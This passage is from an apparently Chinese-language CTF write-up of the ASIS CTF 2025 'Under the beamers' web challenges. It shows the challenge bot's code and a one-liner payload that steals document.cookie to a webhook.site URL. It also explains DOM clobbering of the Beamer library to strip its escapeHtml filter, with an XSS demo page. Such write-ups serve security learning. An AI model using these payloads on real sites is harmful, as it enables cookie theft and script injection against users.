</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="kr">const</span> <span class="nx">textarea</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">"content"</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="nx">textarea</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s2">"input"</span><span class="p">,</span> <span class="nx">updateIframe</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="nb">document</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s2">"DOMContentLoaded"</span><span class="p">,</span> <span class="nx">loadSavedContent</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="o">&lt;</span><span class="err">/script&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">/body&gt;</span>
</span></span></code></pre></div><p>å…¶å®å°±æ˜¯ç›´æ¥æ¸²æŸ“è¿™ä¸ªhtmlåˆ°iframeé‡Œé¢è€Œå·²
ç›´æ¥å¯ä»¥çœ‹åˆ°botè¿™è¾¹</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">async</span> <span class="kd">function</span> <span class="kr">goto</span><span class="p">(</span><span class="nx">html</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nx">logMainInfo</span><span class="p">(</span><span class="s2">"Starting the browser..."</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="kr">const</span> <span class="nx">browser</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">puppeteer</span><span class="p">.</span><span class="nx">launch</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">		<span class="nx">headless</span><span class="o">:</span> <span class="s2">"new"</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="nx">ignoreHTTPSErrors</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="nx">args</span><span class="o">:</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">			<span class="s2">"--no-sandbox"</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">			<span class="s2">"--disable-gpu"</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">			<span class="s2">"--disable-jit"</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">			<span class="s2">"--disable-wasm"</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">			<span class="s2">"--disable-dev-shm-usage"</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="p">],</span>
</span></span><span class="line"><span class="cl">		<span class="nx">executablePath</span><span class="o">:</span> <span class="s2">"/usr/bin/chromium-browser"</span>
</span></span><span class="line"><span class="cl">	<span class="p">});</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="c1">// Hook tabs events
</span></span></span><span class="line"><span class="cl">	<span class="nx">browser</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s2">"targetcreated"</span><span class="p">,</span> <span class="nx">handleTargetCreated</span><span class="p">.</span><span class="nx">bind</span><span class="p">(</span><span class="nx">browser</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">	<span class="nx">browser</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s2">"targetdestroyed"</span><span class="p">,</span> <span class="nx">handleTargetDestroyed</span><span class="p">.</span><span class="nx">bind</span><span class="p">(</span><span class="nx">browser</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="cm">/* ** CHALLENGE LOGIC ** */</span>
</span></span><span class="line"><span class="cl">	<span class="kr">const</span> <span class="p">[</span><span class="nx">page</span><span class="p">]</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">browser</span><span class="p">.</span><span class="nx">pages</span><span class="p">();</span> <span class="c1">// Reuse the page created by the browser.
</span></span></span><span class="line"><span class="cl">	<span class="kr">await</span> <span class="nx">handleTargetCreated</span><span class="p">(</span><span class="nx">page</span><span class="p">.</span><span class="nx">target</span><span class="p">());</span> <span class="c1">// Since it was created before the event listener was set, we need to hook it up manually.
</span></span></span><span class="line"><span class="cl">	<span class="kr">await</span> <span class="nx">page</span><span class="p">.</span><span class="nx">setDefaultNavigationTimeout</span><span class="p">(</span><span class="mi">5000</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="nx">logMainInfo</span><span class="p">(</span><span class="s2">"Going to the app..."</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="kr">await</span> <span class="nx">browser</span><span class="p">.</span><span class="nx">setCookie</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">		<span class="nx">name</span><span class="o">:</span> <span class="s2">"flag"</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="nx">value</span><span class="o">:</span> <span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">FLAG</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="nx">domain</span><span class="o">:</span> <span class="s2">"under-the-beamers-app.internal:5000"</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="nx">path</span><span class="o">:</span> <span class="s2">"/"</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="nx">httpOnly</span><span class="o">:</span> <span class="kc">false</span>
</span></span><span class="line"><span class="cl">	<span class="p">});</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="nx">logMainInfo</span><span class="p">(</span><span class="s2">"Going to the user provided link..."</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">try</span> <span class="p">{</span> <span class="kr">await</span> <span class="nx">page</span><span class="p">.</span><span class="kr">goto</span><span class="p">(</span><span class="sb">`http://under-the-beamers-app.internal:5000/?html=</span><span class="si">${</span><span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">html</span><span class="p">)</span><span class="si">}</span><span class="sb">`</span><span class="p">)</span> <span class="p">}</span> <span class="k">catch</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">	<span class="kr">await</span> <span class="nx">delay</span><span class="p">(</span><span class="mi">2000</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="nx">logMainInfo</span><span class="p">(</span><span class="s2">"Leaving o/"</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="kr">await</span> <span class="nx">browser</span><span class="p">.</span><span class="nx">close</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>åªéœ€è¦ä¼ ä¸ªå‚æ•°è¿‡å»ï¼Œå°±å¯ä»¥ç›´æ¥æ‰§è¡Œjså‘½ä»¤äº†ï¼Œç”šè‡³ä¸ç”¨ç»•CORS</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">'&lt;html&gt;&lt;script&gt;const a=document.cookie;fetch("https://webhook.site/64a13b5f-c498-42f5-b1bc-5bc0ae8761ba/?flag="+a)&lt;/script&gt;&lt;/html&gt;'</span> <span class="p">|</span> nc attack.ip port
</span></span></code></pre></div><p>
<figure>
<img alt="" class="my-0 rounded-md" loading="lazy" src="/img/ASIS-CTF-2025%e5%a4%8d%e7%8e%b0/8.png"/>
</figure>
</p>
<h1 class="relative group">Under the beamers-revange(0 sovled) 
    <div class="anchor" id="under-the-beamers-revange0-sovled"></div>
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
<a aria-label="Anchor" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#under-the-beamers-revange0-sovled">#</a>
</span>
</h1>
<p>ç°åœ¨å› ä¸ºè¿™ç§é¢˜ç›®å‡ºå¤šäº†ï¼Œæˆ‘å°±çŸ¥é“åªè¦å‡ºdompurifyå°±ä¸€å®šä¸æ˜¯0dayï¼Œè¦ä¹ˆå°±æ˜¯æ‰¾libraryçš„æ´ï¼Œè¦ä¹ˆå°±æ˜¯æ‰¾trickå»ç»•ã€‚</p>
<p>å¯¹æ¯”ä¸ä¸Šä¸€é¢˜ï¼Œè¿™é‡ŒåŠ å…¥äº†DOMPurifyï¼ˆæˆ‘çŸ¥é“è‚¯å®šä¸æ˜¯0day : )</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">script</span> <span class="nx">src</span><span class="o">=</span><span class="s2">"https://cdnjs.cloudflare.com/ajax/libs/dompurify/3.2.6/purify.min.js"</span><span class="o">&gt;&lt;</span><span class="err">/script&gt;</span>
</span></span></code></pre></div><p>ç„¶åå¯¹å†…å®¹åšäº†santize</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">sanitizedContent</span> <span class="o">=</span> <span class="nx">DOMPurify</span><span class="p">.</span><span class="nx">sanitize</span><span class="p">(</span><span class="nx">content</span><span class="p">);</span>
</span></span></code></pre></div><p>æ‰€ä»¥å…¶å®ç°åœ¨æˆ‘ä»¬å°±ä¸¤ä¸ªæ–¹å‘ï¼Œä¸€ä¸ªå°±æ˜¯0dayï¼Œä¸€ä¸ªå°±æ˜¯æ‰¾åœ°æ–¹ç»•è¿‡ï¼Œé‚£ä¹ˆæˆ‘ä»¬å…¶å®çœ‹å®Œæºç å°±çŸ¥é“ï¼Œå…¶å®æ²¡åœ°æ–¹åšäº†æ–°çš„å¤„ç†ï¼Œä¹Ÿæ²¡æœ‰trickçš„åœ°æ–¹å› ä¸ºä»–æ˜¯ç›´æ¥æ”¾åˆ°iframeçš„srcdocé‡Œé¢çš„ï¼Œæ‰€ä»¥å”¯ä¸€çš„åœ°æ–¹å°±æ˜¯åœ¨è¿™ä¸ªbeamerçš„libraryä¸­äº†.</p>
<p>æˆ‘ä»¬åœ¨æœ€å¼€å§‹çš„æ—¶å€™å°±å¯ä»¥çœ‹åˆ°ä¸€ä¸ªå¾ˆæœ‰è¶£çš„åœ°æ–¹</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="s2">"undefined"</span> <span class="o">===</span> <span class="k">typeof</span> <span class="nb">window</span><span class="p">.</span><span class="nx">Beamer</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">Beamer</span> <span class="o">=</span> <span class="p">{});</span>
</span></span></code></pre></div><p>ä¹Ÿå°±æ˜¯å½“Beameræ²¡æœ‰å®šä¹‰çš„æ—¶å€™å°±ç»™ä»–èµ‹å€¼ä¸ºä¸€ä¸ªç©ºçš„å¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯ä¸ºäº†ä¿è¯window.Beameræ˜¯å­˜åœ¨çš„ã€‚
è¿™ç§ä¹Ÿå°±æ˜¯æˆ‘ä»¬å¸¸è§çš„Classic Configurable Libraryï¼Œåœ¨è¿™ç§æ¨¡å¼ä¸‹ï¼Œlibraryåœ¨åŠ è½½çš„æ—¶å€™è¦å…ˆå®šä¹‰ä¸€ä¸ªé…ç½®å¯¹è±¡ï¼Œå°±æ˜¯index.htmlä¸­çš„è¿™ä¸ª</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">beamer_config</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nx">product_id</span> <span class="o">:</span> <span class="s2">"TCocQlcK73424"</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	<span class="nx">user_id</span><span class="o">:</span> <span class="s2">"00000000-0000-0000-0000-000000000000"</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span></code></pre></div><p>ç„¶åå†è½½å…¥å¤–éƒ¨/å†…éƒ¨åº“çš„è„šæœ¬æ–‡ä»¶ï¼Œä¸Šé¢ç»™å‡ºçš„undefinedå°±æ˜¯åˆ¤æ–­æ˜¯å¦å¯¹Beameræœ‰å®šä¹‰ï¼Œæ²¡æœ‰çš„è¯å°±è‡ªåŠ¨åˆ›å»ºä¸€ä¸ªï¼Œä¿è¯æ²¡æœ‰å®šä¹‰ä»è€ŒæŠ¥é”™</p>
<p>å¯¹äºè¿™ç§é¢„å…ˆå®šä¹‰çš„å¯¹è±¡ï¼Œæˆ‘ä»¬æ˜¯å¦å¯ä»¥è¦†ç›–æ‰ï¼Ÿè¿™ä¸ªå°±æ˜¯è”ç³»åˆ°æˆ‘ä»¬ä¹‹å‰å­¦ä¹ çš„DOM-clobberingäº†ï¼Œå…·ä½“å¯ä»¥çœ‹ï¼š<strong>æ¢ç´¢xsså®‰å…¨DAYï¼ˆä¸‰ï¼‰</strong> è¿™ä¸€ç¯‡æ–‡ç« ï¼Œæˆ‘ä»¬è¿™é‡ŒåŠ å…¥ä¸€ç‚¹æ–°çš„ä¸œè¥¿</p>
<h2 class="relative group">strict mode? 
    <div class="anchor" id="strict-mode"></div>
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
<a aria-label="Anchor" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#strict-mode">#</a>
</span>
</h2>
<p>ä»–æ˜¯ECMAscript 5å¼•å…¥çš„ä¸€ç§è¯­æ³•å˜ä½“ï¼Œå…¶å®å°±æ˜¯è®©ä½ çš„ä»£ç åœ¨æ›´åŠ ä¸¥æ ¼çš„ç¯å¢ƒä¸‹è¿è¡Œã€‚
å¯åŠ¨ï¼š</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">use</span> <span class="nx">strict</span><span class="p">;</span>
</span></span></code></pre></div><p>åœ¨é™é»˜æ¨¡å¼(default)ä¸‹ï¼š</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">a</span> <span class="na">id</span><span class="o">=</span><span class="s">"x"</span><span class="p">&gt;&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">id</span><span class="o">=</span><span class="s">"x"</span> <span class="na">name</span><span class="o">=</span><span class="s">"y"</span><span class="p">&gt;&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">x</span><span class="p">.</span><span class="nx">y</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="c1">// &lt;a id="x" name="y"&gt;&lt;/a&gt;
</span></span></span><span class="line"><span class="cl"><span class="nx">x</span><span class="p">.</span><span class="nx">y</span> <span class="o">=</span> <span class="s2">"mizu"</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">x</span><span class="p">.</span><span class="nx">y</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="c1">// &lt;a id="x" name="y"&gt;&lt;/a&gt;
</span></span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å¯ä»¥å°è¯•ä¿®æ”¹å±æ€§ï¼Œè™½ç„¶å¹¶ä¸ä¼šæ”¹æ‰å…¶ä¸­çš„å€¼
åœ¨strictæ¨¡å¼ä¸‹ï¼š</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">a</span> <span class="na">id</span><span class="o">=</span><span class="s">"x"</span><span class="p">&gt;&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">id</span><span class="o">=</span><span class="s">"x"</span> <span class="na">name</span><span class="o">=</span><span class="s">"y"</span><span class="p">&gt;&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="s2">"use strict"</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">x</span><span class="p">.</span><span class="nx">y</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="c1">// &lt;a id="x" name="y"&gt;&lt;/a&gt;
</span></span></span><span class="line"><span class="cl"><span class="nx">x</span><span class="p">.</span><span class="nx">y</span> <span class="o">=</span> <span class="s2">"mizu"</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="c1">// Uncaught TypeError: Failed to set a named property 'y' on 'HTMLCollection': Named property setter is not supported.
</span></span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>å¯ä»¥çœ‹åˆ°ä¼šæŠ›å‡ºä¸€ä¸ªé”™è¯¯ï¼Œå³æˆ‘åªè¦å°è¯•æ›´æ”¹è¿™äº›å€¼å°±ä¼šè¢«ç¦æ­¢ï¼Œè€Œé»˜è®¤æƒ…å†µä¸‹é¢éƒ½å±äºé™é»˜æ¨¡å¼ï¼Œåˆ©ç”¨è¿™ä¸€ç‰¹ç‚¹ï¼Œæˆ‘ä»¬æˆ–è®¸å¯ä»¥è¦†ç›–æ‰Beamerçš„æŸäº›ä¸œè¥¿ï¼Ÿ</p>
<h2 class="relative group">DOM-Clobbering gadgeté“¾ 
    <div class="anchor" id="dom-clobbering-gadgeté“¾"></div>
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
<a aria-label="Anchor" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#dom-clobbering-gadget%e9%93%be">#</a>
</span>
</h2>
<p>è¿™é‡Œæˆ‘ç”¨A5rZå†™çš„ä¸€ä¸ªä¾‹å­è‡ªå·±å†™äº†ä¸€ä¸ªã€‚</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE html&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span> <span class="na">lang</span><span class="o">=</span><span class="s">"en"</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">"UTF-8"</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">"viewport"</span> <span class="na">content</span><span class="o">=</span><span class="s">"width=device-width, initial-scale=1.0"</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Dom-clobbering gadget construct!<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">a</span> <span class="na">id</span><span class="o">=</span><span class="s">"Beamer"</span><span class="p">&gt;&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">a</span> <span class="na">id</span><span class="o">=</span><span class="s">"Beamer"</span> <span class="na">name</span><span class="o">=</span><span class="s">"escapeHtml"</span> <span class="na">class</span><span class="o">=</span><span class="s">"remove"</span><span class="p">&gt;&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">"exp"</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="s2">"undefined"</span> <span class="o">===</span> <span class="k">typeof</span> <span class="nb">window</span><span class="p">.</span><span class="nx">Beamer</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">Beamer</span> <span class="o">=</span> <span class="p">{});</span>
</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">'ç°åœ¨Beamerä¸º:'</span><span class="p">,</span><span class="nb">window</span><span class="p">.</span><span class="nx">Beamer</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">'Beamer.escapeHtmlï¼š'</span><span class="p">,</span><span class="nb">window</span><span class="p">.</span><span class="nx">Beamer</span><span class="p">.</span><span class="nx">escapeHtml</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">Beamer</span><span class="p">.</span><span class="nx">escapeHtml</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">a</span><span class="p">)</span> <span class="p">{</span><span class="c1">//è¿‡æ»¤å‡½æ•°
</span></span></span><span class="line"><span class="cl">    <span class="k">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">a</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/&amp;/g</span><span class="p">,</span> <span class="s2">"&amp;amp;"</span><span class="p">).</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/&lt;/g</span><span class="p">,</span> <span class="s2">"&amp;lt;"</span><span class="p">).</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/&gt;/g</span><span class="p">,</span> <span class="s2">"&amp;gt;"</span><span class="p">).</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/"/g</span><span class="p">,</span> <span class="s2">"&amp;quot;"</span><span class="p">).</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/'/g</span><span class="p">,</span> <span class="s2">"&amp;#039;"</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">catch</span><span class="p">(</span><span class="nx">b</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">a</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">"å®šä¹‰å®ŒBeamer.escapeHtmlåçš„å€¼:"</span><span class="p">,</span><span class="nb">window</span><span class="p">.</span><span class="nx">Beamer</span><span class="p">.</span><span class="nx">escapeHtml</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">rm</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByClassName</span><span class="p">(</span><span class="s1">'remove'</span><span class="p">)[</span><span class="mi">0</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">"åˆ©ç”¨getElementsByClassNameå¾—åˆ°çš„å€¼ï¼š"</span><span class="p">,</span><span class="nx">rm</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">rm</span><span class="p">)</span> <span class="nx">rm</span><span class="p">.</span><span class="nx">remove</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">"åˆ é™¤å:"</span><span class="p">,</span><span class="nb">window</span><span class="p">.</span><span class="nx">Beamer</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">"ç§»é™¤åBeamer.escapeHtmlï¼š"</span><span class="p">,</span><span class="nb">window</span><span class="p">.</span><span class="nx">Beamer</span><span class="p">.</span><span class="nx">escapeHtml</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">xss_payload</span> <span class="o">=</span> <span class="s1">'&lt;img src=x onerror="alert(\'DOM Clobbering\')"&gt;'</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="s1">'undefined'</span> <span class="o">!==</span> <span class="k">typeof</span> <span class="nx">Beamer</span><span class="p">.</span><span class="nx">escapeHtml</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="nx">xss_payload</span> <span class="o">=</span> <span class="nx">Beamer</span><span class="p">.</span><span class="nx">escapeHtml</span><span class="p">(</span><span class="nx">xss_payload</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">'exp'</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">xss_payload</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>
<figure>
<img alt="" class="my-0 rounded-md" loading="lazy" src="/img/ASIS-CTF-2025%e5%a4%8d%e7%8e%b0/9.png"/>
</figure>

å¯ä»¥çœ‹åˆ°æˆåŠŸçš„æŠŠescapeHtmlç»™ä»–å»æ‰äº†
å¯¹åº”çš„å€¼ï¼š







<figure>
<img alt="" class="my-0 rounded-md" loading="lazy" src="/img/ASIS-CTF-2025%e5%a4%8d%e7%8e%b0/10.png"/>
</figure>
</p>
<h2 class="relative group">åˆ©ç”¨ 
    <div class="anchor" id="åˆ©ç”¨-1"></div>
<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
<a aria-label="Anchor" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#%e5%88%a9%e7%94%a8-1">#</a>
</span>
</h2>
<p>è€Œå¯¹äºæˆ‘ä»¬è¿™é“é¢˜ç›®ï¼Œå› ä¸ºä»–ä¼šå¯¹å†™å…¥åˆ°innerHtmlçš„æ•°æ®è¿›è¡ŒescapeHtmlï¼Œæ‰€ä»¥æˆ‘ä»¬å°±è¦ç”¨åˆ°ä¸Šé¢çš„æ‰‹æ³•æ„é€ ä¸€ä¸ªé“¾å­æŠŠè¿™ä¸ªtagç»™ä»–åˆ äº†ã€‚
MIZUå¸ˆå‚…ç”¨äº†è¿™ä¸ªå‡½æ•°:</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">Beamer</span><span class="p">.</span><span class="nx">removeIframe</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">a</span> <span class="o">=</span> <span class="nx">Beamer</span><span class="p">.</span><span class="nx">isInApp</span><span class="p">()</span> <span class="o">?</span> <span class="s2">"beamerNews"</span> <span class="o">:</span> <span class="s2">"beamerOverlay"</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">Beamer</span><span class="p">.</span><span class="nx">forEachElement</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">b</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">b</span><span class="p">.</span><span class="nx">parentNode</span><span class="p">.</span><span class="nx">removeChild</span><span class="p">(</span><span class="nx">b</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>è€Œåœ¨æ­¤ä¹‹å‰ï¼Œæˆ‘ä»¬è¦çœ‹ä¸€ä¸‹isInAppæ˜¯åšäº†ä»€ä¹ˆ</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">Beamer</span><span class="p">.</span><span class="nx">isInApp</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
